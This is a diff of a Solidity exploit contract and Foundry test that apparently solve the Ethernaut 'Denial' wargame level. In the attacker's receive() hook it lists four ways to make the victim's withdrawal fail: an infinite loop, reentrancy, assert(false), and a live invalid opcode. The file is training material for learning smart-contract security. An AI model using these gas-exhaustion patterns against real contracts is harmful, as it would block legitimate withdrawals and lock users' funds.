@@ -21,7 +21,29 @@ contract DenialAttack {
   }
 
   receive() external payable {
-    challenge.withdraw();
+    // pick the alternative you fancy the most
+
+    // alternative 1
+    // infinite loop
+    // "EvmError: OutOfGas"
+    // while (true) {}
+
+    // alternative 2
+    // reentrancy attack
+    // "EvmError: OutOfGas"
+    // challenge.withdraw();
+
+    // alternative 3
+    // invalid opcode
+    // "EvmError: InvalidOpcode"
+    assembly { invalid() }
+
+    // alternative 4
+    // consume all the gas with an assert(false)
+    // for some reason is not working in solidity > 0.8.5
+    //   see this link
+    //   https://ethereum.stackexchange.com/a/113362
+    // assert(false);
   }
 }
 
@@ -36,7 +58,6 @@ contract DenialTest is Test {
 
   function testExploit() public {
     attackContract.attack();
-
     utils.submitLevelInstance(challengeAddress);
   }
 }
